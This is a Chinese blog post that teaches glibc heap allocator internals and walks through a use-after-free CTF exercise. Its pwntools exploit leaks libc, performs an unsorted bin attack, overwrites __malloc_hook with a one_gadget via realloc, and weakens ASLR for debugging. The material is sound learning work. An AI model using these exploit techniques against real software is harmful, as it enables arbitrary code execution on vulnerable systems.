---
layout: post
title: 堆利用(一)之基础知识及uaf/double free
tags: []
categories:

  - 二进制
date: 2020-11-25 20:42:00
---
### 基础知识



#### 内存分配的机制



1、通过brk和mmap实现malloc内存分配

![upload successful](/images/pasted-26.png)


arena个数：

![upload successful](/images/pasted-27.png)



​		malloc_state结构体代码如下，其存储于glibc的全局变量中。变量名为main_arena。malloc_state存储堆区域的状态信息，其中包括了很多管理空闲块的bins链表。

```c
/*
   ----------- Internal state representation and initialization -----------
 */

struct malloc_state
{
  /* Serialize access.  */
  mutex_t mutex;

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;

  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;

  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};
```



#### 申请堆块

malloc：实际内存为 0x10的chunk头 + 申请的大小，直接返回堆地址

calloc：先清空堆内存空间，再返回堆地址。(丢弃之前块的内容)

realloc

```txt
chunk=malloc(16);
chunk1=realloc(chunk,32);

当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时
如果申请 size > 原来 size
如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小,相当于从top chunk上切下来需要补上的大小
如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)

如果申请 size < 原来 size
如果*相差*不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变
如果*相差*可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分(因为还可以再使用)

当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)
当 realloc(ptr,size) 的 size 等于 ptr 的size，不进行任何操作
```



#### 释放堆块



free：先进行判断。

(1)大小 chunk_size <= max_fast(0x80) 

(2)位置 chunk不位于heap的顶部，即不与top chunk相邻

如果满足上面两种情况，则放到fast bins中，否则放到unsorted bin中

在实际操作的时候，bins可以查看相应的bin信息

![upload successful](/images/pasted-28.png)

理论是这样的，但是在实际操作的时候发现加入了tcachebins机制，释放的堆块都放入了tcachebins中


![upload successful](/images/pasted-29.png)


查阅资料发现，只有tcachebins满了之后，才会存入fastbins中。并且tcache也是区分块的大小的。

![upload successful](/images/pasted-30.png)

可以用如下代码进行测试

```python 
#include <stdio.h>
#include <malloc.h>

int main(){
        int *a, *b, *b1, *c, *d, *t1, *t2, *t3, *t4, *t5, *t6, *t7;
        t1 = (int *)malloc(0x79);
        t2 = (int *)malloc(0x79);
        t3 = (int *)malloc(0x79);
        t4 = (int *)malloc(0x79);
        t5 = (int *)malloc(0x79);
        t6 = (int *)malloc(0x79);
        t7 = (int *)malloc(0x79);
        a = (int *)malloc(0x30);
  			b1 = (int *)malloc(0x79);
        b = (int *)malloc(0x68);
        c = (int *)malloc(0x69);
        d = (int *)malloc(0x30);

        free(t1);
        free(t2);
        free(t3);
        free(t4);
        free(t5);
        free(t6);
        free(t7);

        free(a);
        free(b);
        free(c);
        free(d);

        return 0;
}
```



调试可获得如下知识：

* 最开始释放的堆块会放在tcachebins中，并且数量限制为7，它指向的是fd地址，即chunk地址+0x10。


![upload successful](/images/pasted-31.png)

chunk地址如下


![upload successful](/images/pasted-32.png)



所以原来的代码不能测试想要的东西，需要重新设计代码

代码思路：用到的是0x30,0x79,0x80,0x90，需要先把相应的tcachebins填满后，才能放到fastbins里面。

对0x30大小的块进行测试，创建8块，并释放。

可以得出结论：tcache的容量大小为7。并且申请的 0x30大小的块，先被放入0x40的tcachebins中，再被放入到了0x40的fastbin中。


![upload successful](/images/pasted-33.png)


![upload successful](/images/pasted-34.png)


申请的0x79大小的块，先被放入0x90的tcachebins中，然后并没有放入fastbins中，而是放入了unsortedbin中。


![upload successful](/images/pasted-35.png)

第8块被放入了unsortbin中，而在释放完第九块之后，又神奇的没有了。可能是有其他机制，我还没学到而已。（2021.10.10更新：现在认为应该是释放的2个快被合并到top chunk了。）


![upload successful](/images/pasted-36.png)



再来测试0x80，申请0x80大小的块，先被放在0x90大小的tcachebins中，然后释放的第八块被放在了unsortedbin中，释放的第9块没有显示，释放完最后一块（第十块）之后，unsortedbin被清空了，啥也没有了。


![upload successful](/images/pasted-37.png)



测试0x78大小的块，发现放在了fastbins的0x80里面

![upload successful](/images/pasted-38.png)

此处理解到这个程度就可以啦！

调试代码如下,测试的时候a/b/c/d单个单个测试。

```python
#include <stdio.h>
#include <malloc.h>

int main(){
        int *a[8];
        int *b[9];
        int *c[10];
        int *d[10];

        int i = 0;
        for(i=0; i<8; i++){
                a[i] = (int *)malloc(0x30);
        }
        for(i = 0; i < 8; i++){
                free(a[i]);
        }

        for(i=0; i<9; i++){
                b[i] = (int *)malloc(0x79);
        }
        for(i = 0; i < 9; i++){
                free(b[i]);
        }

        for(i=0; i<10; i++){
                c[i] = (int *)malloc(0x80);
        }
        for(i = 0; i < 10; i++){
                free(c[i]);        
        }

        for(i=0; i<8; i++){
                d[i] = (int *)malloc(0x78);
        }
        for(i = 0; i < 8; i++){
                free(d[i]);
        }

}
```



#### 内存对齐



堆块复用知识

规则：

0x61 - 68:—> 0x71【 8位 】剩下的9 10 11 12 13 14 15 16，共8个字节，可以利用下一个堆块的pre_size，

0x69 - 6f:—> 0x81 【 7位 】剩下的不够利用为pre_size，需要再开辟0x10的空间。

0x70 - 0x78 —> 0x81 



即假设申请的大小为0x60，它给开辟的空间的大小就是0x71。可以用如下程序进行测试

```python
#include <malloc.h>
#include <stdio.h>

int main(){
        int *a, *b, *c, *d, *e, *f, *g, *h, *i, *j;
        a = (int *)malloc(0x59); 
        b = (int *)malloc(0x60);
        c = (int *)malloc(0x67);
        d = (int *)malloc(0x68);
        e = (int *)malloc(0x69);
        f = (int *)malloc(0x6f);
        g = (int *)malloc(0x70);
        h = (int *)malloc(0x77);
        i = (int *)malloc(0x78);
        j = (int *)malloc(0x79);
        return 0;
}
```

使用gdb进行调试，heap查看堆块相应的信息。


![upload successful](/images/pasted-39.png)


0x30gx 地址，可以查看堆块相应的内容,此处用 x/100gx 0x555555756250 查看。

![upload successful](/images/pasted-40.png)

0x59 ---> 0x71

0x60 ---> 0x71

0x67 ---> 0x71

0x68 ---> 0x71

0x69 ---> 0x81

0x6f---> 0x81

0x70---> 0x81

0x77---> 0x81

0x78---> 0x81

0x79---> 0x91

所以可以看成，以0x8和0x9为分界线，到了0x9，就要加个0x10

### 堆块chunk的结构



1、基于glibc中的源码

glibc中搜索malloc_chunk，可以找到定义的结构体

```c
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

mchunk_prev_size 和 mchunk_size 都是8字节，32位。所以两个大小就是0x10。

fd是下一块空闲堆块，bk是前一块空闲堆块，每个8字节，大小总共0x10。



```txt

    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of previous chunk, if unallocated (P clear)  |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             User data starts here...                          .
	    .                                                               .
	    .             (malloc_usable_size() bytes)                      .
	    .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             (size of chunk, but used for application data)    |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of next chunk, in bytes                |A|0|1|
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

```



mchunk_prev_size只有在前一块未被使用的时候才用来表示前一个块的chunk。

mchunk_size：当前chunk的大小。AMP是标志位

A：A=0 为主分区分配，A=1 为非主分区分配，即是否是main_arena。

M：M=1表示使用mmap映射区域，M=0为使用heap区域，brk申请。

P：P=1 表示**pre_chunk**空闲，未分配，mchunk_prev_size才有效。0表示**前一个**堆块已分配。

【这里应该是记错了，后来查了一下，1表示前一个堆块被使用，0表示未被使用。】



2、top chunk

位于最底部，最高地址处。

bin中的块都不能使用时，会从top chunk中再切割出相应的大小。

### bin的分类和结构

**tcachebins**

单链表，用fd指针。

只对链表头进行操作，有点类似栈。



**fastbin**

单链表，用fd指针，后进先出。

大小:  0x20 — 0x80

不进行合并的操作，chunk被free，不会清理next chunk的PREV_INUSE标志。



**unsortedbin**

循环双链表，头插法，尾删法。

| 头 ------ 尾

大小：0x80 — 任意大小

会对物理相邻的free chunk 进行合并操作

会残留main_arena 的地址

只存在唯一一个unsorted bin，当有一个chunk(非fastbin)被free时，首先会放入unsorted bin中，后续整理的时候才会放入相应的small bin或large bin中。



**small bins**

类似unsorted bin 

大小：0x20-0x3f0 (0x3f0 = 十进制的1008)

一共有62个small bin，16字节为公差，单调递增，等差数列





**large bins**

大小：0x400 — 无穷大

一共有63个large bin，从bins[126], bins[127] 到bins[251] 共63个。每个 bin 中的 chunk 大小不是一个固定公差的等差数列，而是分成 6 组 bin，每组 bin 是一个 固定公差的等差数列，每组的 bin 数量依次为 32、16、8、4、2、1，公差依次为 64B、512B、 4096B、32768B、262144B 等。

每个bin表示一组size范围，而不是具体的size。如bins[126] 和bins[127] 的链表中保存的chunk size为【0x400 , 0x440】的chunk。

在每个bin中，从大到小进行排列，脱链时从小到大找符合条件的堆块

双向循环链表，先进先出，空闲堆块会合并。



### malloc()的工作流程

1、fastbin找到则结束

2、small bin 找到则结束

3、合并所有chunk(利用函数malloc_consolidate())    [2021.10.28补充：结合House of Rabbit]

4、进入循环

* 检查unsorted bin中的last_remainder，如果满足，则从last_remainder划分。

* unsorted bin中搜索，同时整理。如果遇到精确大小，则返回并分配。否则就把当前chunk整理到small / large bin中去。
* 在small bin 和 large bin中搜索最合适的chunk (不一定是精确大小)。

5、使用top chunk



### 常见漏洞及利用方法



#### UAF



原理：free后没有清空内存，导致free状态的内存空间再次被使用

利用：修改free状态块的fd 和 bk指针，指向我们想要的内容。再次再分配的时候就会分配这个已经free掉的块，并且其中的指针指向的是我们想要的地址

注意：fastbin中指向的块的大小与原块的大小要保持一致

**练习1---chunk**

首先分析程序，ida打开。

再根据程序的逻辑，写出交互。

基本格式如下

```python
#coding=utf8
from pwn import *

context.log_level = 'debug'
context(arch='amd64', os='linux')

local = 1
elf = ELF('./chunk')
if local:
    p = process('./chunk')
    libc = elf.libc
else:
    p = remote('172.16.229.161',7001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

XXX(交互)
        
        
p.interactive()

```

交互如下：

```python
def add(idx,size):
    ru("Your choice: ")
    sl('1')
    ru("Give me a book ID: ")
    sl(str(idx))
    ru("how long: ")
    sl(str(size))
def show(idx):
    ru("Your choice: ")
    sl('2')
    ru("Which book do you want to show?")
    sl(str(idx))
def free(idx):
    ru("Your choice: ")
    sl('3')
    ru("Which one to throw?")
    sl(str(idx))
def edit(idx,size,py):
    ru("Your choice: ")
    sl('4')
    ru("Which book to write?")
    sl(str(idx))
    ru("how big?")
    sl(str(size))
    ru("Content: ")
    sd(py)
```



调试exp的时候，先设下断点debug(0)，然后在终端输入tmux，即可在窗口运行python程序，如下，非常炫酷。

![upload successful](/images/pasted-41.png)

要关闭tmux窗口的话，需要运行tmux kill-window

tmux下翻页需要：control+b，松开，再按[，即可上下翻页。退出翻屏模式是q。但是这个还是比较复杂的。其它调试方法如下：

在需要停止的地方设下`pause()` ，然后python执行。它会暂停在我们设置的地方。

在另一个窗口执行如下

```txt
ps -aux | grep chunk #chunk为要调试的程序

sudo gdb attach PID
```

 即可调试。



我们在调试的时候，先malloc 3个大小为0x68的堆块

ida中查看可知，malloc后的chunk放置的地址是`0x602280`


![upload successful](/images/pasted-42.png)



![upload successful](/images/pasted-43.png)


![upload successful](/images/pasted-44.png)


gdb中查看确实是这样，并且这里放置了3个堆块。


![upload successful](/images/pasted-45.png)


同样，可以找到chunk的size放置的位置


![upload successful](/images/pasted-46.png)


![upload successful](/images/pasted-48.png)



free掉0号堆块

脚本如下

```python
add(0,0x68)
add(1,0x68)
add(2,0x68)
free(0)
pause()
```



发现size没有发生变化，chunk发生了细微的变化

![upload successful](/images/pasted-49.png)


tcachebins中已经存在了刚才free掉的块


![upload successful](/images/pasted-50.png)


查看堆块发现其中的fd指针是空的，所以在上图bin中它指向了0x0。


![upload successful](/images/pasted-51.png)



漏洞原理：此时我仍然可以edit 0号块的堆块，并且往fd指针写入内容。

脚本如下

```python
add(0,0x68)
add(1,0x68)
add(2,0x68)
free(0)
edit(0,0x20,'a'*0x10+'c'*0x10)
```



查看堆块内容可知，堆块的fd指针和bk指针被改变了。


![upload successful](/images/pasted-52.png)



![upload successful](/images/pasted-53.png)

到这里可以得到两个公理：

1、往free状态的堆块写内容，是从fd指针的位置开始写的，因为0号堆块指针指向的就是fd指针的位置

2、fd指针的bk指针各占0x8的大小，共0x10。 



我们可以修改fd的指针，使它指向一个有效的值。比如指向 0x13b0330

```python
add(0,0x68)
add(1,0x68)
add(2,0x68)
free(0)
edit(0,0x20,p64(0x13b0330))

pause()

```



查看heap的内容


![upload successful](/images/pasted-54.png)



小插曲：自己本来没安装pwngdb，需要安装，并且改变 ～/.gdbinit文件内容为，即可使用parseheap命令

```python
source ~/Pwngdb/angelheap/gdbinit.py
source ~/pwndbg/gdbinit.py
```





按理来说，这时0x340这个堆块应该已经是free状态了，但是自己查看bins发现它还不是free状态。


![upload successful](/images/pasted-55.png)
这是因为我fd的内容放错了，放的是0x13b0340，如果放成0x12f330，却发现又变了....


![upload successful](/images/pasted-56.png)


为什么会放错呢？我眼神应该不至于差到这种地步。又多试验了一下发地址的前面在每次运行的时候都是变化的。再运行一次，又变成了如下


![upload successful](/images/pasted-57.png)



我脑子一转，很快啊，就发现是开启了地址随机化。这好吗？这不好。更改的方法为：改变 `/proc/sys/kernel/randomize_va_space` 中的值。

0 --- 关闭所有随机化

1 --- 打开mmap base 、 栈 、 VDSO页面的随机化

2 --- 在1的基础上打开堆地址随机化

(小补充：如果开启了PIE，程序的基地址会从0开始)

我将其改为1即可。不可直接在文件中更改，使用语句 `echo 1 > /proc/sys/kernel/randomize_va_space` 即可。



再次查看堆地址，发现used状态的地址为 0x603330，在程序中进行更改

```python
add(0,0x68)
add(1,0x68)
add(2,0x68)
free(0)
edit(0,0x20,p64(0x603330))

pause()

```

发现，虽然bins中记录了它，但是parseheap中查看，它仍然是used状态的。


![upload successful](/images/pasted-58.png)

![upload successful](/images/pasted-59.png)

换成其它地址的堆块效果也一样，和课上讲的 parseheap中也会变成free状态不同。思考一下原因🤔，没有利用成功是因为老师课上是用的fastbin来演示，而我用的是tcachebins，我指向的时候需要再把地址+0x10。 更改过后可以成功。


![upload successful](/images/pasted-60.png)



如果这时候再add一个0x68大小的堆块，在tcachebins中会分走头部的堆块，结果如下，把原来头部260的分走了


![upload successful](/images/pasted-61.png)


在fastbin中，会分走尾部的堆块。



再次申请，就会把我们刚才构造的那个堆块分走

```python
add(0,0x68)
add(1,0x68)
add(2,0x68)
free(0)
edit(0,0x20,p64(0x6032d0))
add(0,0x68)
add(3,0x68)
```




![upload successful](/images/pasted-62.png)



但是发现，tcachebins的数组计数的地方，保存的是真实的堆块的数量，比如现在就变成了-1.


![upload successful](/images/pasted-63.png)


telescope查看 发现现在1号块和3号块指向的都是同样的内容，即0x6032d0，这是我们自己构造的。

![upload successful](/images/pasted-64.png)

这时又自己构造了uaf，因为free(1),edit(3) 就相当于这个块先free掉之后又被修改了。

```python
add(0,0x68)
add(1,0x68)
add(2,0x68)
free(0)
edit(0,0x20,p64(0x6032d0)+'\n')
add(0,0x68)
add(3,0x68)
free(1)
edit(3,0x10,'b'*0x10 + '\n')
pause()
```



但是这时神奇地发现，堆块没有到tcachebins中，而是到了fastbins中

![upload successful](/images/pasted-65.png)

本质就是改free状态的堆块的指针。

除了上述操作，也可以通过show函数直接泄漏出地址。因为free完之后会和main_arena连接，所以show的时候会把真实的地址打印出来。

![upload successful](/images/pasted-66.png)

可以修改一下脚本接受地址

```python
add(0,0x108)
add(1,0x108)
add(2,0x108)
free(0)

show(0)
ru("Content: ")
addr = u64(rc(6).ljust(8,'\x00'))
print "add --->" + hex(addr)

pause()

```



这就接收到了地址，是main_arena+88的地址
![upload successful](/images/pasted-67.png)


![upload successful](/images/pasted-68.png)



接下来计算和libc的基地值

调试的时候可以直接查看到libc的基地值：

vmmap命令，就可以看到libc-2.23的起始地址


![upload successful](/images/pasted-69.png)

计算验证

找到相应的libc.so文件(amd64)，ida打开(64位) 

```txt
i386 --- 32位 (偏移普遍 1BXXXX)
amd64 --- 64位 (偏移普遍 3CXXXX)
```



option + T ，找到malloc_trim函数，F5反汇编为伪C函数

![upload successful](/images/pasted-70.png)

```txt
0xdd1b78 - 88 = 0xdd1b20 #即是 main_arena 的地址

0xdd1b20 - 0x3c4b20 = 0xad000 #即是 libc的基地值
```



接下来行云流水一波操作

```python
system = libc_base + libc.sym["system"]
binsh = libc_base + libc.search('/bin/sh').next()

print "system --->" + hex(system) + '\n'
print "binsh --->" + hex(binsh) + '\n'

pause()

```

![upload successful](/images/pasted-71.png)



也可以利用one_gadget来找到bin/sh

首先ldd查看动态链接库，再使用one_gadget查找


![upload successful](/images/pasted-72.png)



脚本中可使用如下语句

```python
one_gadget = libc_base + 0xf0364
print "one_gadget --->" + hex(one_gadget) + '\n'
```


![upload successful](/images/pasted-73.png)



以上是我们申请的堆块大小为0x68大小的时候。如果堆块更大一些，会到unsortedbin中，造成unsortedbin attack。

注意：unsortedbin是循环双链表，同时用到了fd指针和bk指针。



还是使用chunk来测试。由于最开始的7块会放到tcachebins中，所以要先把tcachebins填充掉。

脚本如下

```python
for i in range(10):
    add(i,0x108)

for i in range(7):
    free(i)

free(7)
edit(7,0x20,p64(0)+p64(0x602020))

pause()

p.interactive()
```

去edit free掉的7号块，传入地址，fd的地址为0，bk的地址为`0x602020`，结果如下


![upload successful](/images/pasted-74.png)


这里有一个问题就是 bins后面显示的值和内存中是不一样的，可能是工具本身存在的小问题？或者有什么机制是我还不知道的，先不去管他。[2021.10.27更新：bins指向的内容为0x602020 + 0x38处的值。]


![upload successful](/images/pasted-75.png)



如果将bk部分存放成 [chunk的size的地址]0x6020E0(ida中查看得到)

`edit(7,0x20,p64(0)+p64(0x6020E0)+"\n")`，可以看到bk部分被写入了size的值


![upload successful](/images/pasted-76.png)


这时，再次申请的时候( 要先把tcachebins中的申请完之后才会再申请unsortedbin中的 )，会写入一个地址，某个chunk的size就会变成一个超大的值，在edit的时候就可以无限溢出了。

```python
for i in range(10):
    add(i,0x108)

for i in range(7):
    free(i)

free(7)
edit(7,0x20,p64(0)+p64(0x6020E0)+"\n")

for i in range(7):
    add(i+10,0x108)

add(18,0x108)

pause()
```

原本设想是可以的，加上add(18,0x108)之后程序总是出错无法运行，所以更换ubuntu的版本进行尝试，尽量找没有tcachebins机制的。



版本如下

![upload successful](/images/pasted-77.png)



重新改脚本

```python
add(0,0x108)
add(1,0x108)
add(2,0x108)
free(0)

edit(0,0x20,p64(0)+p64(0x6020E0)+"\n"

add(3,0x108)
     
pause()

```



free(0)之后


![upload successful](/images/pasted-78.png)


![upload successful](/images/pasted-79.png)


![upload successful](/images/pasted-80.png)


edit之后

edit(0,0x20,p64(0)+p64(0x6020E0)+"\n")

bk指向了size的值，且fd的值为0


![upload successful](/images/pasted-81.png)


add(3,0x108)之后，发现原来free掉的0号块被分配给了3号块


![upload successful](/images/pasted-82.png)


并且原来的size地址(0x6020e0)的fd部分就会被写入一个main_arean+88的值


![upload successful](/images/pasted-83.png)

根据 顺序：

```txt
0 | 1
2 | 3
.....
```

2号块的size变成了一个超大的值，即edit 2号块的时候，可以无限溢出。

这就是unsorted bin attack。



malloc_hook是在调用malloc的时候调用的一个函数。

```python
malloc_hook = libc_base + libc.sym["__malloc_hook"]
fake_chunk = malloc_hook - 0x23
```

前人在fake_chunk的位置找到了一个0x7f的size头，实际上size是0x70，因为size的后4位是不用的，我们就可以往fake_chunk的位置写入内容。


![upload successful](/images/pasted-84.png)



脚本如下，往3号块的fd位置写入fake_chunk的地址

```python
add(3,0x68)
free(3)
edit(3,0x8,p64(fake_chunk))
```


![upload successful](/images/pasted-85.png)

fake_chunk 再往后会覆盖 __malloc_hook ，如果往malloc_hook里面写入system的内容，就会实现malloc劫持。


![upload successful](/images/pasted-86.png)




```python
add(0,0x108)
add(1,0x108)
add(2,0x108)
free(0)

....

add(3,0x68)
free(3)
edit(3,0x8,p64(fake_chunk))

add(4,0x68) #申请到了原来的0&3号块
add(5,0x68) #申请到了一个新的块

pause()

p.interactive()

```



ida中可以查看到chunk的地址是0x602280


![upload successful](/images/pasted-87.png)



telescope 查看各个堆块的内容。块之间的关系是：3号块利用的是free掉的0号块，但是又free了一次，所以4号块用的是free掉的3号块。


![upload successful](/images/pasted-91.png)

因为3号块的fd原来写入的是fakechunk的地址，即1aed，后来分配给了4号块，4号块在fd位置处是fake_chunk的地址。(在bins中显示的都是 地址+0x10)。再次malloc 5号块的时候，就会把[fake_chunk的地址 + 0x10的值]写入到chunk的位置处。


![upload successful](/images/pasted-92.png)

![upload successful](/images/pasted-93.png)

我们再edit5号块，就是在edit fake_chunk。

由于`fake_chunk = malloc_hook - 0x23`，此处使用的fake_chunk由于已经+0x10，只填充0x13就可以填充到malloc_hook的起始位置。

```python
py = ''
py+= 'a'*0x13 + p64(one_gadget) + '\n'
edit(5,0x40,py)

```

使用的one_gadget的地址是 one_gadget --->0x7ffff7afd364 。再次执行就会发现，malloc_hook处被改成了one_gadget的值。


![upload successful](/images/pasted-94.png)


![upload successful](/images/pasted-97.png)


此时如果再add，就会执行到malloc_hook处，转而执行one_gadget。

```python
add(6,0x68)
```

直接这样add不行，会导致程序崩溃。

把断点下在add()处

![upload successful](/images/pasted-98.png)


```python
debug(0x40094F,0)
add(6,0x68)
```

[发现使用debug可以直接进行调试，不用再使用 ps -aux | grep "name" & sudo gdb attach XXX]

c，继续执行，就会到我们下断点的地方，是add()函数。s步入。

找到malloc函数，我们申请的大小是0x68。

![upload successful](/images/pasted-99.png)

si进入。调用malloc的时候会调用malloc_hook


![upload successful](/images/pasted-100.png)



再次si进入。发现会调用/bin/sh。


![upload successful](/images/pasted-101.png)


stack 查看栈上的内容。使用one_gadget需要满足的条件是：栈上30 50 70的位置要为0。

由于30 50 70处的值都不是0，所以不能getshell


![upload successful](/images/pasted-102.png)



解决方法1：思考malloc的时候的size能不能控制

ida查看 由于size输入的是整型，我们不能直接修改为/bin/sh，理论上是不可以的。


![upload successful](/images/pasted-103.png)

验证脚本如下

```python
py = ''
py+= 'a'*0x13 + p64(system) + '\n'  #原来的one_gadget 修改为system
edit(5,0x40,py)

debug(0x400AD2,0) #断点改为malloc的地址，如下

add(6,'$0') #即/bin/sh

```

![upload successful](/images/pasted-104.png)


进入malloc，jmp rax的时候会执行到system。


![upload successful](/images/pasted-105.png)


![upload successful](/images/pasted-106.png)

但是由于system的参数是/bin/sh，而要求输入的是整型，所以会出错，程序结束。此方法不通。所以还是需要用one_gadget。



解决方法2: 使用 realloc

```python
realloc = libc_base + libc.sym["realloc"]
...
py = ''
py+= 'a'*11 + p64(one_gadget) + p64(realloc) + '\n'  #原来填充的是0x13即19，现在填充11，realloc的地址上写上one_gadet。
...
add(6,0x68)
```



这里出现了错误，程序终止运行，不知道为什么。后来修改了add的块的个数，即前面add(0)和add(1)，没有add(2)，可以正常运行。

代码如下

```python
add(0,0x108)
add(1,0x108)

free(0)
show(0)
ru("Content: ")
libc_base = u64(rc(6).ljust(8,'\x00')) - 0x3c4b78
print "libc_base --->" + hex(libc_base) + '\n'

system = libc_base + libc.sym["system"]
binsh = libc_base + libc.search('/bin/sh').next()

print "system --->" + hex(system) + '\n'
print "binsh --->" + hex(binsh) + '\n'

#------one_gadget:0x45226 0x4527a 0xf0364 0xf1207------------

one_gadget = libc_base + 0xf0364
print "one_gadget --->" + hex(one_gadget) + '\n'

malloc_hook = libc_base + libc.sym["__malloc_hook"]
realloc = libc_base + libc.sym["realloc"]
print "malloc_hook --->" + hex(malloc_hook)

print "realloc --->" + hex(realloc)
fake_chunk = malloc_hook - 0x23
print "fake_chunk ---> " + hex(fake_chunk)

add(2,0x68)
free(2)
edit(2,0x8,p64(fake_chunk))

add(3,0x68)
add(4,0x68)

py = ''
#py += 'a'*0x23 + p64(one_gadget) + '\n'
py+= 'a'*11 + p64(one_gadget) + p64(realloc) + '\n'
edit(4,0x40,py)

debug(0x400AD2,0)

add(5,0x68)

p.interactive()
                
```



![upload successful](/images/pasted-107.png)

即malloc的时候跳转到__malloc_hook，再跳转到realloc，再跳到one_gadget。

[2021.10.27补充：如果malloc_hook不满足one_gadget的利用要求，可以利用realloc来微调栈。它的汇编代码 在调用realloc_hook之前 多了很多push和sub指令。

我们覆盖0x13，即19个字节的大小，再往后覆盖就能覆盖到malloc_hook。现在的payload将malloc_hook覆盖为realloc_hook，查看地址可以看到 它在malloc_hook之前8个地址的位置。现在这个被我们覆盖为了one_gadget。]

执行realloc的之后会有一些push，这些push的作用就是使得栈上的偏移发生变化。


![upload successful](/images/pasted-108.png)



此时不能getshell，因为栈上的偏移不为0。


![upload successful](/images/pasted-109.png)



关于寄存器

```txt
%rax 作为函数返回值使用。
%rsp 栈指针寄存器，指向栈顶
%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数。。。
%rbx，%rbp，%r12，%r13，%14，%15 用作数据存储，遵循被调用者使用规则，简单说就是随便用，调用子函数之前要备份它，以防他被修改
%r10，%r11 用作数据存储，遵循调用者使用规则，简单说就是使用之前要先保存原值
```



下面需要继续调偏移

```python
py+= 'a'*11 + p64(one_gadget) + p64(realloc+1) + '\n'
```

调试

![upload successful](/images/pasted-110.png)
可能哪里出错啦


![upload successful](/images/pasted-111.png)



栈偏移修改为2


![upload successful](/images/pasted-112.png)



这时发现！！70处的值为0！！！


![upload successful](/images/pasted-114.png)

此时one_adget 要找70处的偏移。


![upload successful](/images/pasted-113.png)



修改one_gadget的值

`one_gadget = libc_base + 0xf1207`

这时realloc从+2开始，相当于最开始少了一个push。


![upload successful](/images/pasted-115.png)


再查看栈上的内容，发现参数的70的位置变成了0
![upload successful](/images/pasted-116.png)

即argv位置参数为0

![upload successful](/images/pasted-117.png)



getshell!!!!!!!!!!!!!!!!!!!!!!


![upload successful](/images/pasted-118.png)



完整的exp如下

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./chunk')
if local:
    p = process('./chunk')
    libc = elf.libc
else:
    p = remote('172.16.229.161',7001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(idx,size):
    ru("Your choice: ")
    sl('1')
    ru("Give me a book ID: ")
    sl(str(idx))
    ru("how long: ")
    sl(str(size))
def show(idx):
    ru("Your choice: ")
    sl('2')
    ru("Which book do you want to show?")
    sl(str(idx))
def free(idx):
    ru("Your choice: ")
    sl('3')
    ru("Which one to throw?")
    sl(str(idx))
def edit(idx,size,py):
    ru("Your choice: ")
    sl('4')
    ru("Which book to write?")
    sl(str(idx))
    ru("how big?")
    sl(str(size))
    ru("Content: ")
    sd(py)


add(0,0x108)
add(1,0x108)
free(0)
show(0)
ru("Content: ")
libc_base = u64(rc(6).ljust(8,'\x00')) - 0x3c4b78
print "libc_base --->" + hex(libc_base) + '\n'

